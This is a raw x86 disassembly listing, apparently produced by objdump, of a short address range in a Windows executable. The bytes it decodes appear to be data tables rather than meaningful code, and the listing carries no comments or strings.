  407ba3:	0c 13                	or     $0x13,%al
  407ba5:	00 21                	add    %ah,(%ecx)
  407ba7:	02 b7 0d 17 00 29    	add    0x2900170d(%edi),%dh
  407bad:	02 09                	add    (%ecx),%cl
  407baf:	01 74 01 61          	add    %esi,0x61(%ecx,%eax,1)
  407bb3:	00 15 0e 3a 04 61    	add    %dl,0x61043a0e
  407bb9:	00 2f                	add    %ch,(%edi)
  407bbb:	0e                   	push   %cs
  407bbc:	3a 04 61             	cmp    (%ecx,%eiz,2),%al
  407bbf:	00 48 0e             	add    %cl,0xe(%eax)
  407bc2:	3a 04 61             	cmp    (%ecx,%eiz,2),%al
  407bc5:	00 5f 0e             	add    %bl,0xe(%edi)
  407bc8:	3a 04 31             	cmp    (%ecx,%esi,1),%al
  407bcb:	02 7f 0e             	add    0xe(%edi),%bh
  407bce:	4a                   	dec    %edx
  407bcf:	04 69                	add    $0x69,%al
  407bd1:	00 89 0e 71 00 81    	add    %cl,-0x7eff8ef2(%ecx)
  407bd7:	02 28                	add    (%eax),%ch
  407bd9:	0f 58 04 31          	addps  (%ecx,%esi,1),%xmm0
  407bdd:	02 2e                	add    (%esi),%ch
  407bdf:	0f 63 04 91          	packsswb (%ecx,%edx,4),%mm0
  407be3:	02 51 0f             	add    0xf(%ecx),%dl
  407be6:	17                   	pop    %ss
  407be7:	00 39                	add    %bh,(%ecx)
  407be9:	00 68 0f             	add    %ch,0xf(%eax)
  407bec:	6a 04                	push   $0x4
  407bee:	a1 02 80 0f 71       	mov    0x710f8002,%eax
  407bf3:	04 b9                	add    $0xb9,%al
  407bf5:	01 89 0f 83 04 a9    	add    %ecx,-0x56fb7cf1(%ecx)
  407bfb:	02 9b 0f 8a 04 a9    	add    -0x56fb75f1(%ebx),%bl
  407c01:	02 ad 0f 90 04 59    	add    0x5904900f(%ebp),%ch
  407c07:	02 b8 0f 96 04 31    	add    0x3104960f(%eax),%bh
  407c0d:	02 c1                	add    %cl,%al
  407c0f:	0f 4a 04 a1          	cmovp  (%ecx,%eiz,4),%eax
  407c13:	02 d3                	add    %bl,%dl
  407c15:	0f 9b 04 79          	setnp  (%ecx,%edi,2)
  407c19:	00 09                	add    %cl,(%ecx)
  407c1b:	01 ac 04 61 02 09 01 	add    %ebp,0x1090261(%esp,%eax,1)
  407c22:	ac                   	lods   %ds:(%esi),%al
  407c23:	04 b1                	add    $0xb1,%al
  407c25:	02 e2                	add    %dl,%ah
  407c27:	0f b2 04 b9          	lss    (%ecx,%edi,4),%eax
  407c2b:	02 f7                	add    %bh,%dh
  407c2d:	0f b9 04 b9          	ud1    (%ecx,%edi,4),%eax
  407c31:	02 01                	add    (%ecx),%al
  407c33:	10 be 04 c1 02 10    	adc    %bh,0x1002c104(%esi)
  407c39:	10 c3                	adc    %al,%bl
  407c3b:	04 39                	add    $0x39,%al
  407c3d:	01 15 10 23 01 39    	add    %edx,0x39012310
  407c43:	02 09                	add    (%ecx),%cl
  407c45:	01 13                	add    %edx,(%ebx)
  407c47:	00 39                	add    %bh,(%ecx)
  407c49:	02 25 10 9d 01 61    	add    0x61019d10,%ah
  407c4f:	00 47 0b             	add    %al,0xb(%edi)
  407c52:	c6 04 c9 02          	movb   $0x2,(%ecx,%ecx,8)
  407c56:	3e 10 cc             	ds adc %cl,%ah
  407c59:	04 a1                	add    $0xa1,%al
  407c5b:	02 51 10             	add    0x10(%ecx),%dl
  407c5e:	d2 04 c9             	rolb   %cl,(%ecx,%ecx,8)
  407c61:	02 65 10             	add    0x10(%ebp),%ah
  407c64:	e1 04                	loope  0x407c6a
  407c66:	b9 02 6b 10 7f       	mov    $0x7f106b02,%ecx
  407c6b:	03 71 00             	add    0x0(%ecx),%esi
  407c6e:	73 10                	jae    0x407c80
  407c70:	13 00                	adc    (%eax),%eax
  407c72:	49                   	dec    %ecx
  407c73:	01 79 10             	add    %edi,0x10(%ecx)
  407c76:	b9 04 61 00 09       	mov    $0x9006104,%ecx
  407c7b:	01 13                	add    %edx,(%ebx)
  407c7d:	00 61 00             	add    %ah,0x0(%ecx)
  407c80:	80 10 eb             	adcb   $0xeb,(%eax)
  407c83:	04 69                	add    $0x69,%al
  407c85:	02 8e 10 89 01 69    	add    0x69018910(%esi),%cl
  407c8b:	02 9b 10 89 01 69    	add    0x69018910(%ebx),%bl
  407c91:	02 a9 10 df 02 69    	add    0x6902df10(%ecx),%ch
  407c97:	02 bd 10 df 02 69    	add    0x6902df10(%ebp),%bh
  407c9d:	02 d7                	add    %bh,%dl
  407c9f:	10 df                	adc    %bl,%bh
  407ca1:	02 69 02             	add    0x2(%ecx),%ch
  407ca4:	f2 10 df             	repnz adc %bl,%bh
  407ca7:	02 61 00             	add    0x0(%ecx),%ah
  407caa:	47                   	inc    %edi
  407cab:	0b 64 03 61          	or     0x61(%ebx,%eax,1),%esp
  407caf:	00 05 11 13 00 69    	add    %al,0x69001311
  407cb5:	02 11                	add    (%ecx),%dl
  407cb7:	11 df                	adc    %ebx,%edi
  407cb9:	02 61 00             	add    0x0(%ecx),%ah
  407cbc:	2b 11                	sub    (%ecx),%edx
  407cbe:	68 00 61 00 32       	push   $0x32006100
  407cc3:	11 13                	adc    %edx,(%ebx)
  407cc5:	00 61 00             	add    %ah,0x0(%ecx)
  407cc8:	45                   	inc    %ebp
  407cc9:	11 13                	adc    %edx,(%ebx)
  407ccb:	00 61 00             	add    %ah,0x0(%ecx)
  407cce:	59                   	pop    %ecx
  407ccf:	11 f1                	adc    %esi,%ecx
  407cd1:	04 71                	add    $0x71,%al
  407cd3:	02 20                	add    (%eax),%ah
  407cd5:	02 71 00             	add    0x0(%ecx),%dh
  407cd8:	61                   	popa
  407cd9:	00 67 11             	add    %ah,0x11(%edi)
  407cdc:	f7 04 e1 02 84 11 89 	testl  $0x89118402,(%ecx,%eiz,8)
  407ce3:	01 41 02             	add    %eax,0x2(%ecx)
  407ce6:	8e 11                	mov    (%ecx),%ss
  407ce8:	13 00                	adc    (%eax),%eax
  407cea:	61                   	popa
  407ceb:	00 ae 0d 13 00 61    	add    %ch,0x6100130d(%esi)
  407cf1:	00 94 11 fd 04 61 00 	add    %dl,0x6104fd(%ecx,%edx,1)
  407cf8:	a1 11 71 00 39       	mov    0x39007111,%eax
  407cfd:	01 b1 11 3e 01 41    	add    %esi,0x41013e11(%ecx)
  407d03:	01 20                	add    %esp,(%eax)
  407d05:	02 71 00             	add    0x0(%ecx),%dh
  407d08:	39 01                	cmp    %eax,(%ecx)
  407d0a:	cd 11                	int    $0x11
  407d0c:	3e 01 41 01          	add    %eax,%ds:0x1(%ecx)
  407d10:	cf                   	iret
  407d11:	0a 03                	or     (%ebx),%al
  407d13:	05 61 00 da 11       	add    $0x11da0061,%eax
  407d18:	09 05 61 00 e9 11    	or     %eax,0x11e90061
  407d1e:	13 00                	adc    (%eax),%eax
  407d20:	49                   	dec    %ecx
  407d21:	01 ee                	add    %ebp,%esi
  407d23:	11 cd                	adc    %ecx,%ebp
  407d25:	00 e9                	add    %ch,%cl
  407d27:	02 ee                	add    %dh,%ch
  407d29:	11 0f                	adc    %ecx,(%edi)
  407d2b:	05 f1 02 3f 12       	add    $0x123f02f1,%eax
  407d30:	15 05 f9 02 4e       	adc    $0x4e02f905,%eax
  407d35:	12 9d 01 f9 02 5e    	adc    0x5e02f901(%ebp),%bl
  407d3b:	12 9d 01 f9 02 69    	adc    0x6902f901(%ebp),%bl
  407d41:	12 1b                	adc    (%ebx),%bl
  407d43:	05 41 02 09 01       	add    $0x1090241,%eax
  407d48:	20 05 41 02 ae 0d    	and    %al,0xdae0241
  407d4e:	13 00                	adc    (%eax),%eax
  407d50:	49                   	dec    %ecx
  407d51:	02 09                	add    (%ecx),%cl
  407d53:	01 89 01 09 03 09    	add    %ecx,0x9030901(%ecx)
  407d59:	01 74 01 11          	add    %esi,0x11(%ecx,%eax,1)
  407d5d:	03 10                	add    (%eax),%edx
  407d5f:	10 0c 01             	adc    %cl,(%ecx,%eax,1)
  407d62:	01 03                	add    %eax,(%ebx)
  407d64:	99                   	cltd
  407d65:	12 26                	adc    (%esi),%ah
  407d67:	05 19 03 b7 12       	add    $0x12b70319,%eax
  407d6c:	32 05 01 03 bf 12    	xor    0x12bf0301,%al
  407d72:	38 05 21 03 cf 12    	cmp    %al,0x12cf0321
  407d78:	42                   	inc    %edx
  407d79:	05 f9 02 d7 12       	add    $0x12d702f9,%eax
  407d7e:	89 01                	mov    %eax,(%ecx)
  407d80:	49                   	dec    %ecx
  407d81:	01 f2                	add    %esi,%edx
  407d83:	12 4a 05             	adc    0x5(%edx),%cl
  407d86:	49                   	dec    %ecx
  407d87:	01 f9                	add    %edi,%ecx
  407d89:	12 32                	adc    (%edx),%dh
  407d8b:	01 b9 02 06 13 38    	add    %edi,0x38130602(%ecx)
  407d91:	01 49 01             	add    %ecx,0x1(%ecx)
  407d94:	15 13 51 05 39       	adc    $0x39055113,%eax
  407d99:	01 23                	add    %esp,(%ebx)
  407d9b:	13 23                	adc    (%ebx),%esp
  407d9d:	01 e9                	add    %ebp,%ecx
  407d9f:	02 79 10             	add    0x10(%ecx),%bh
  407da2:	b9 04 f9 02 2f       	mov    $0x2f02f904,%ecx
  407da7:	13 58 05             	adc    0x5(%eax),%ebx
  407daa:	49                   	dec    %ecx
  407dab:	01 3d 13 27 01 f9    	add    %edi,0xf9012713
  407db1:	02 42 13             	add    0x13(%edx),%al
  407db4:	58                   	pop    %eax
  407db5:	05 11 00 56 13       	add    $0x13560011,%eax
  407dba:	5f                   	pop    %edi
  407dbb:	05 31 03 60 13       	add    $0x13600331,%eax
  407dc0:	13 00                	adc    (%eax),%eax
  407dc2:	31 03                	xor    %eax,(%ebx)
  407dc4:	65 13 89 01 39 03 83 	adc    %gs:-0x7cfcc6ff(%ecx),%ecx
  407dcb:	13 65 05             	adc    0x5(%ebp),%esp
  407dce:	41                   	inc    %ecx
  407dcf:	03 98 13 6c 05 79    	add    0x79056c13(%eax),%ebx
  407dd5:	02 a6 13 72 05 79    	add    0x79057213(%esi),%ah
  407ddb:	02 b2 13 64 03 f1    	add    -0xefc9bed(%edx),%dh
  407de1:	02 c3                	add    %bl,%al
  407de3:	13 76 05             	adc    0x5(%esi),%esi
  407de6:	49                   	dec    %ecx
  407de7:	03 25 10 9d 01 51    	add    0x51019d10,%esp
  407ded:	03 e7                	add    %edi,%esp
  407def:	13 7c 05 49          	adc    0x49(%ebp,%eax,1),%edi
  407df3:	03 ec                	add    %esp,%ebp
  407df5:	13 9d 01 c9 02 f7    	adc    -0x8fd36ff(%ebp),%ebx
  407dfb:	13 3e                	adc    (%esi),%edi
  407dfd:	01 39                	add    %edi,(%ecx)
  407dff:	03 ff                	add    %edi,%edi
  407e01:	13 83 05 81 02 08    	adc    0x8028105(%ebx),%eax
  407e07:	14 0b                	adc    $0xb,%al
  407e09:	04 61                	add    $0x61,%al
  407e0b:	03 09                	add    (%ecx),%ecx
  407e0d:	01 89 01 61 03 1c    	add    %ecx,0x1c036101(%ecx)
  407e13:	14 18                	adc    $0x18,%al
  407e15:	06                   	push   %es
  407e16:	61                   	popa
  407e17:	03 2b                	add    (%ebx),%ebp
  407e19:	14 71                	adc    $0x71,%al
  407e1b:	00 61 03             	add    %ah,0x3(%ecx)
  407e1e:	34 14                	xor    $0x14,%al
  407e20:	2f                   	das
  407e21:	06                   	push   %es
  407e22:	19 01                	sbb    %eax,(%ecx)
  407e24:	2b 14 71             	sub    (%ecx,%esi,2),%edx
  407e27:	00 19                	add    %bl,(%ecx)
  407e29:	01 17                	add    %edx,(%edi)
  407e2b:	0d eb 03 69 03       	or     $0x36903eb,%eax
  407e30:	20 02                	and    %al,(%edx)
  407e32:	71 00                	jno    0x407e34
  407e34:	f9                   	stc
  407e35:	02 b4 14 48 06 54 00 	add    0x540648(%esp,%edx,1),%dh
  407e3c:	98                   	cwtl
  407e3d:	13 5c 06 5c          	adc    0x5c(%esi,%eax,1),%ebx
  407e41:	00 a6 13 8b 00 71    	add    %ah,0x71008b13(%esi)
  407e47:	03 bf 14 6f 06 71    	add    0x71066f14(%edi),%edi
  407e4d:	03 2b                	add    (%ebx),%ebp
  407e4f:	14 71                	adc    $0x71,%al
  407e51:	00 41 01             	add    %al,0x1(%ecx)
  407e54:	cf                   	iret
  407e55:	0a 75 06             	or     0x6(%ebp),%dh
  407e58:	91                   	xchg   %eax,%ecx
  407e59:	03 09                	add    (%ecx),%ecx
  407e5b:	01 89 01 99 03 09    	add    %ecx,0x9039901(%ecx)
  407e61:	01 89 01 a1 03 09    	add    %ecx,0x903a101(%ecx)
  407e67:	01 ac 06 b1 03 5b 15 	add    %ebp,0x155b03b1(%esi,%eax,1)
  407e6e:	ba 06 b1 03 67       	mov    $0x6703b106,%edx
  407e73:	15 c0 06 b1 03       	adc    $0x3b106c0,%eax
  407e78:	70 15                	jo     0x407e8f
  407e7a:	cb                   	lret
  407e7b:	06                   	push   %es
  407e7c:	29 01                	sub    %eax,(%ecx)
  407e7e:	7a 15                	jp     0x407e95
  407e80:	d1 06                	roll   $1,(%esi)
  407e82:	29 01                	sub    %eax,(%ecx)
  407e84:	8d 15 23 01 29 01    	lea    0x1290123,%edx
  407e8a:	9d                   	popf
  407e8b:	15 23 01 39 01       	adc    $0x1390123,%eax
  407e90:	b1 15                	mov    $0x15,%cl
  407e92:	3e 01 71 03          	add    %esi,%ds:0x3(%ecx)
  407e96:	09 01                	or     %eax,(%ecx)
  407e98:	89 01                	mov    %eax,(%ecx)
  407e9a:	71 03                	jno    0x407e9f
  407e9c:	bd 15 eb 03 b9       	mov    $0xb903eb15,%ebp
  407ea1:	03 09                	add    (%ecx),%ecx
  407ea3:	01 13                	add    %edx,(%ebx)
  407ea5:	00 b1 03 0f 16 ba    	add    %dh,-0x45e9f0fd(%ecx)
  407eab:	06                   	push   %es
  407eac:	c9                   	leave
  407ead:	03 27                	add    (%edi),%esp
  407eaf:	16                   	push   %ss
  407eb0:	db 06                	fildl  (%esi)
  407eb2:	c1 03 09             	roll   $0x9,(%ebx)
  407eb5:	01 13                	add    %edx,(%ebx)
  407eb7:	00 b1 01 20 02 1b    	add    %dh,0x1b022001(%ecx)
  407ebd:	05 c1 03 33 16       	add    $0x163303c1,%eax
  407ec2:	e2 06                	loop   0x407eca
  407ec4:	c1 03 20             	roll   $0x20,(%ebx)
  407ec7:	02 71 00             	add    0x0(%ecx),%dh
  407eca:	41                   	inc    %ecx
  407ecb:	01 3a                	add    %edi,(%edx)
  407ecd:	16                   	push   %ss
  407ece:	e9 06 41 01 44       	jmp    0x4441bfd9
  407ed3:	16                   	push   %ss
  407ed4:	71 00                	jno    0x407ed6
  407ed6:	b9 02 4c 16 32       	mov    $0x32164c02,%ecx
  407edb:	01 d9                	add    %ebx,%ecx
  407edd:	03 7f 16             	add    0x16(%edi),%edi
  407ee0:	0a 07                	or     (%edi),%al
  407ee2:	d9 03                	flds   (%ebx)
  407ee4:	84 16                	test   %dl,(%esi)
  407ee6:	12 07                	adc    (%edi),%al
  407ee8:	d1 03                	roll   $1,(%ebx)
  407eea:	8f                   	(bad)
  407eeb:	16                   	push   %ss
  407eec:	19 07                	sbb    %eax,(%edi)
  407eee:	29 00                	sub    %eax,(%eax)
  407ef0:	98                   	cwtl
  407ef1:	16                   	push   %ss
  407ef2:	71 00                	jno    0x407ef4
  407ef4:	41                   	inc    %ecx
  407ef5:	01 a5 16 1f 07 d1    	add    %esp,-0x2ef8e0ea(%ebp)
  407efb:	03 ae 16 24 07 d9    	add    -0x26f8dbea(%esi),%ebp
  407f01:	03 6b 09             	add    0x9(%ebx),%ebp
  407f04:	2a 07                	sub    (%edi),%al
  407f06:	e1 03                	loope  0x407f0b
  407f08:	09 01                	or     %eax,(%ecx)
  407f0a:	13 00                	adc    (%eax),%eax
  407f0c:	f1                   	int1
  407f0d:	03 ef                	add    %edi,%ebp
  407f0f:	16                   	push   %ss
  407f10:	41                   	inc    %ecx
  407f11:	07                   	pop    %es
  407f12:	f1                   	int1
  407f13:	03 02                	add    (%edx),%eax
  407f15:	17                   	pop    %ss
  407f16:	47                   	inc    %edi
  407f17:	07                   	pop    %es
  407f18:	f1                   	int1
  407f19:	03 0b                	add    (%ebx),%ecx
  407f1b:	17                   	pop    %ss
  407f1c:	4e                   	dec    %esi
  407f1d:	07                   	pop    %es
  407f1e:	e9 03 1b 17 54       	jmp    0x54579a26
  407f23:	07                   	pop    %es
  407f24:	f1                   	int1
  407f25:	03 2f                	add    (%edi),%ebp
  407f27:	17                   	pop    %ss
  407f28:	4e                   	dec    %esi
  407f29:	07                   	pop    %es
  407f2a:	51                   	push   %ecx
  407f2b:	01 3f                	add    %edi,(%edi)
  407f2d:	17                   	pop    %ss
  407f2e:	f1                   	int1
  407f2f:	04 71                	add    $0x71,%al
  407f31:	02 20                	add    (%eax),%ah
  407f33:	02 1b                	add    (%ebx),%bl
  407f35:	05 01 04 7b 17       	add    $0x177b0401,%eax
  407f3a:	84 07                	test   %al,(%edi)
  407f3c:	09 04 09             	or     %eax,(%ecx,%ecx,1)
  407f3f:	01 8a 07 09 04 aa    	add    %ecx,-0x55fbf6f9(%edx)
  407f45:	17                   	pop    %ss
  407f46:	91                   	xchg   %eax,%ecx
  407f47:	07                   	pop    %es
  407f48:	19 04 09             	sbb    %eax,(%ecx,%ecx,1)
  407f4b:	01 9d 01 19 04 29    	add    %ebx,0x29041901(%ebp)
  407f51:	18 a8 07 29 04 98    	sbb    %ch,-0x67fbd6f9(%eax)
  407f57:	13 ae 07 31 04 a6    	adc    -0x59fbcef9(%esi),%ebp
  407f5d:	13 b4 07 21 04 2d 18 	adc    0x182d0421(%edi,%eax,1),%esi
  407f64:	2a 07                	sub    (%edi),%al
  407f66:	31 04 b2             	xor    %eax,(%edx,%esi,4)
  407f69:	13 64 03 41          	adc    0x41(%ebx,%eax,1),%esp
  407f6d:	01 17                	add    %edx,(%edi)
  407f6f:	0d 68 00 c1 03       	or     $0x3c10068,%eax
  407f74:	17                   	pop    %ss
  407f75:	0d 68 00 31 00       	or     $0x310068,%eax
  407f7a:	09 01                	or     %eax,(%ecx)
  407f7c:	cd 07                	int    $0x7
  407f7e:	79 01                	jns    0x407f81
  407f80:	ae                   	scas   %es:(%edi),%al
  407f81:	0d 13 00 39 04       	or     $0x4390013,%eax
  407f86:	09 01                	or     %eax,(%ecx)
  407f88:	89 01                	mov    %eax,(%ecx)
  407f8a:	39 04 3a             	cmp    %eax,(%edx,%edi,1)
  407f8d:	18 71 00             	sbb    %dh,0x0(%ecx)
  407f90:	71 01                	jno    0x407f93
  407f92:	59                   	pop    %ecx
  407f93:	0b e0                	or     %eax,%esp
  407f95:	07                   	pop    %es
  407f96:	b1 03                	mov    $0x3,%cl
  407f98:	4a                   	dec    %edx
  407f99:	18 ba 06 39 00 ab    	sbb    %bh,-0x54ffc6fa(%edx)
  407f9f:	03 e5                	add    %ebp,%esp
  407fa1:	07                   	pop    %es
  407fa2:	59                   	pop    %ecx
  407fa3:	02 7f 18             	add    0x18(%edi),%bh
  407fa6:	68 00 59 02 89       	push   $0x89025900
  407fab:	18 68 00             	sbb    %ch,0x0(%eax)
  407fae:	49                   	dec    %ecx
  407faf:	02 09                	add    (%ecx),%cl
  407fb1:	01 ac 04 51 04 94 18 	add    %ebp,0x18940451(%esp,%eax,1)
  407fb8:	fd                   	std
  407fb9:	07                   	pop    %es
  407fba:	51                   	push   %ecx
  407fbb:	04 9e                	add    $0x9e,%al
  407fbd:	18 06                	sbb    %al,(%esi)
  407fbf:	08 51 04             	or     %dl,0x4(%ecx)
  407fc2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407fc3:	18 0d 08 51 04 ae    	sbb    %cl,0xae045108
  407fc9:	18 13                	sbb    %dl,(%ebx)
  407fcb:	00 59 04             	add    %bl,0x4(%ecx)
  407fce:	5b                   	pop    %ebx
  407fcf:	15 11 08 b1 02       	adc    $0x2b10811,%eax
  407fd4:	c1 18 17             	rcrl   $0x17,(%eax)
  407fd7:	08 59 02             	or     %bl,0x2(%ecx)
  407fda:	09 01                	or     %eax,(%ecx)
  407fdc:	1d 08 b1 02 ce       	sbb    $0xce02b108,%eax
  407fe1:	18 26                	sbb    %ah,(%esi)
  407fe3:	08 51 04             	or     %dl,0x4(%ecx)
  407fe6:	ff 0c 13             	decl   (%ebx,%edx,1)
  407fe9:	00 01                	add    %al,(%ecx)
  407feb:	03 b8 0f 96 04 79    	add    0x7904960f(%eax),%edi
  407ff1:	00 d3                	add    %dl,%bl
  407ff3:	18 30                	sbb    %dh,(%eax)
  407ff5:	08 49 02             	or     %cl,0x2(%ecx)
  407ff8:	09 01                	or     %eax,(%ecx)
  407ffa:	38 08                	cmp    %cl,(%eax)
  407ffc:	61                   	popa
  407ffd:	04 e9                	add    $0xe9,%al
  407fff:	18 41 08             	sbb    %al,0x8(%ecx)
  408002:	41                   	inc    %ecx
  408003:	04 09                	add    $0x9,%al
  408005:	01 46 08             	add    %eax,0x8(%esi)
  408008:	49                   	dec    %ecx
  408009:	04 09                	add    $0x9,%al
  40800b:	01 7a 03             	add    %edi,0x3(%edx)
  40800e:	49                   	dec    %ecx
  40800f:	04 f1                	add    $0xf1,%al
  408011:	18 4e 08             	sbb    %cl,0x8(%esi)
  408014:	01 03                	add    %eax,(%ebx)
  408016:	bf 12 55 08 81       	mov    $0x81085512,%edi
  40801b:	00 fb                	add    %bh,%bl
  40801d:	18 9b 08 81 00 0c    	sbb    %bl,0xc008108(%ebx)
  408023:	19 71 00             	sbb    %esi,0x0(%ecx)
  408026:	69 04 09 01 7a 03 71 	imul   $0x71037a01,(%ecx,%ecx,1),%eax
  40802d:	04 09                	add    $0x9,%al
  40802f:	01 13                	add    %edx,(%ebx)
  408031:	00 79 04             	add    %bh,0x4(%ecx)
  408034:	09 01                	or     %eax,(%ecx)
  408036:	89 01                	mov    %eax,(%ecx)
  408038:	81 04 09 01 89 01 89 	addl   $0x89018901,(%ecx,%ecx,1)
  40803f:	04 09                	add    $0x9,%al
  408041:	01 89 01 91 04 09    	add    %ecx,0x9049101(%ecx)
  408047:	01 89 01 99 04 09    	add    %ecx,0x9049901(%ecx)
  40804d:	01 89 01 a1 04 09    	add    %ecx,0x904a101(%ecx)
  408053:	01 89 01 a9 04 09    	add    %ecx,0x904a901(%ecx)
  408059:	01 89 01 b1 04 09    	add    %ecx,0x904b101(%ecx)
  40805f:	01 89 01 29 00 83    	add    %ecx,-0x7cffd6ff(%ecx)
  408065:	00 f1                	add    %dh,%cl
  408067:	01 2e                	add    %ebp,(%esi)
  408069:	00 43 09             	add    %al,0x9(%ebx)
  40806c:	e4 02                	in     $0x2,%al
  40806e:	2e 00 3b             	add    %bh,%cs:(%ebx)
  408071:	09 e4                	or     %esp,%esp
  408073:	02 2e                	add    (%esi),%ch
  408075:	00 0b                	add    %cl,(%ebx)
  408077:	09 b6 08 2e 00 13    	or     %esi,0x13002e08(%esi)
  40807d:	09 d5                	or     %edx,%ebp
  40807f:	08 2e                	or     %ch,(%esi)
  408081:	00 33                	add    %dh,(%ebx)
  408083:	09 e4                	or     %esp,%esp
  408085:	02 2e                	add    (%esi),%ch
  408087:	00 03                	add    %al,(%ebx)
  408089:	09 ad 08 2e 00 4b    	or     %ebp,0x4b002e08(%ebp)
  40808f:	09 e4                	or     %esp,%esp
  408091:	02 2e                	add    (%esi),%ch
  408093:	00 1b                	add    %bl,(%ebx)
  408095:	09 ff                	or     %edi,%edi
  408097:	08 2e                	or     %ch,(%esi)
  408099:	00 23                	add    %ah,(%ebx)
  40809b:	09 e4                	or     %esp,%esp
  40809d:	02 2e                	add    (%esi),%ch
  40809f:	00 2b                	add    %ch,(%ebx)
  4080a1:	09 e4                	or     %esp,%esp
  4080a3:	02 40 00             	add    0x0(%eax),%al
  4080a6:	2b 00                	sub    (%eax),%eax
  4080a8:	bc 01 40 00 13       	mov    $0x13004001,%esp
  4080ad:	00 94 01 43 00 13 00 	add    %dl,0x130043(%ecx,%eax,1)
  4080b4:	94                   	xchg   %eax,%esp
  4080b5:	01 43 00             	add    %eax,0x0(%ebx)
  4080b8:	1b 00                	sbb    (%eax),%eax
  4080ba:	a3 01 49 00 83       	mov    %eax,0x83004901
  4080bf:	00 02                	add    %al,(%edx)
  4080c1:	02 63 00             	add    0x0(%ebx),%ah
  4080c4:	13 00                	adc    (%eax),%eax
  4080c6:	94                   	xchg   %eax,%esp
  4080c7:	01 63 00             	add    %esp,0x0(%ebx)
  4080ca:	1b 00                	sbb    (%eax),%eax
  4080cc:	a3 01 69 00 83       	mov    %eax,0x83006901
  4080d1:	00 16                	add    %dl,(%esi)
  4080d3:	02 80 00 2b 00 bc    	add    -0x43ffd500(%eax),%al
  4080d9:	01 83 00 73 00 bc    	add    %eax,-0x43ff8d00(%ebx)
  4080df:	01 83 00 7b 00 bc    	add    %eax,-0x43ff8500(%ebx)
  4080e5:	01 83 00 1b 00 a3    	add    %eax,-0x5cffe500(%ebx)
  4080eb:	01 89 00 83 00 23    	add    %ecx,0x23008300(%ecx)
  4080f1:	02 a0 00 2b 00 bc    	add    -0x43ffd500(%eax),%ah
  4080f7:	01 a1 00 db 00 bc    	add    %esp,-0x43ff2500(%ecx)
  4080fd:	01 a1 00 e3 00 bc    	add    %esp,-0x43ff1d00(%ecx)
  408103:	01 a3 00 13 00 94    	add    %esp,-0x6bffed00(%ebx)
  408109:	01 a3 00 c3 00 6c    	add    %esp,0x6c00c300(%ebx)
  40810f:	02 c0                	add    %al,%al
  408111:	00 2b                	add    %ch,(%ebx)
  408113:	00 bc 01 c3 00 d3 00 	add    %bh,0xd300c3(%ecx,%eax,1)
  40811a:	e4 02                	in     $0x2,%al
  40811c:	c3                   	ret
  40811d:	00 13                	add    %dl,(%ebx)
  40811f:	00 94 01 e0 00 2b 00 	add    %dl,0x2b00e0(%ecx,%eax,1)
  408126:	bc 01 00 01 13       	mov    $0x13010001,%esp
  40812b:	00 94 01 00 01 2b 00 	add    %dl,0x2b0100(%ecx,%eax,1)
  408132:	bc 01 20 01 2b       	mov    $0x2b012001,%esp
  408137:	00 bc 01 20 01 13 00 	add    %bh,0x130120(%ecx,%eax,1)
  40813e:	94                   	xchg   %eax,%esp
  40813f:	01 40 01             	add    %eax,0x1(%eax)
  408142:	13 00                	adc    (%eax),%eax
  408144:	94                   	xchg   %eax,%esp
  408145:	01 40 01             	add    %eax,0x1(%eax)
  408148:	2b 00                	sub    (%eax),%eax
  40814a:	bc 01 60 01 13       	mov    $0x13016001,%esp
  40814f:	00 94 01 60 01 2b 00 	add    %dl,0x2b0160(%ecx,%eax,1)
  408156:	bc 01 63 01 73       	mov    $0x73016301,%esp
  40815b:	00 bc 01 80 01 2b 00 	add    %bh,0x2b0180(%ecx,%eax,1)
  408162:	bc 01 a0 01 2b       	mov    $0x2b01a001,%esp
  408167:	00 bc 01 c0 01 13 00 	add    %bh,0x1301c0(%ecx,%eax,1)
  40816e:	94                   	xchg   %eax,%esp
  40816f:	01 c0                	add    %eax,%eax
  408171:	01 2b                	add    %ebp,(%ebx)
  408173:	00 bc 01 c3 01 03 01 	add    %bh,0x10301c3(%ecx,%eax,1)
  40817a:	f8                   	clc
  40817b:	02 c3                	add    %bl,%al
  40817d:	01 e3                	add    %esp,%ebx
  40817f:	00 bc 01 e0 01 2b 00 	add    %bh,0x2b01e0(%ecx,%eax,1)
  408186:	bc 01 e3 01 e3       	mov    $0xe301e301,%esp
  40818b:	00 bc 01 00 02 2b 00 	add    %bh,0x2b0200(%ecx,%eax,1)
  408192:	bc 01 00 02 13       	mov    $0x13020001,%esp
  408197:	00 94 01 80 02 93 01 	add    %dl,0x1930280(%ecx,%eax,1)
  40819e:	bc 01 a0 02 e3       	mov    $0xe302a001,%esp
  4081a3:	00 bc 01 41 03 a3 06 	add    %bh,0x6a30341(%ecx,%eax,1)
  4081aa:	9d                   	popf
  4081ab:	06                   	push   %es
  4081ac:	00 04 e3             	add    %al,(%ebx,%eiz,8)
  4081af:	00 bc 01 00 04 9b 01 	add    %bh,0x19b0400(%ecx,%eax,1)
  4081b6:	bc 01 20 04 9b       	mov    $0x9b042001,%esp
  4081bb:	01 bc 01 20 04 e3 00 	add    %edi,0xe30420(%ecx,%eax,1)
  4081c2:	bc 01 60 06 e3       	mov    $0xe3066001,%esp
  4081c7:	00 bc 01 60 06 9b 01 	add    %bh,0x19b0660(%ecx,%eax,1)
  4081ce:	bc 01 80 06 e3       	mov    $0xe3068001,%esp
  4081d3:	00 bc 01 00 09 e3 00 	add    %bh,0xe30900(%ecx,%eax,1)
  4081da:	bc 01 c0 0a e3       	mov    $0xe30ac001,%esp
  4081df:	00 bc 01 47 00 b3 06 	add    %bh,0x6b30047(%ecx,%eax,1)
  4081e6:	4b                   	dec    %ebx
  4081e7:	00 b3 06 dd 01 e2    	add    %dh,-0x1dfe22fa(%ebx)
  4081ed:	01 e7                	add    %esp,%edi
  4081ef:	01 ec                	add    %ebp,%esp
  4081f1:	01 3c 02             	add    %edi,(%edx,%eax,1)
  4081f4:	40                   	inc    %eax
  4081f5:	02 4b 02             	add    0x2(%ebx),%cl
  4081f8:	50                   	push   %eax
  4081f9:	02 5f 02             	add    0x2(%edi),%bl
  4081fc:	5f                   	pop    %edi
  4081fd:	02 da                	add    %dl,%bl
  4081ff:	02 52 03             	add    0x3(%edx),%dl
  408202:	a3 03 c4 03 f7       	mov    %eax,0xf703c403
  408207:	03 fe                	add    %esi,%edi
  408209:	03 18                	add    (%eax),%ebx
  40820b:	04 fe                	add    $0xfe,%al
  40820d:	03 26                	add    (%esi),%esp
  40820f:	04 fe                	add    $0xfe,%al
  408211:	03 35 04 41 04 50    	add    0x50044104,%esi
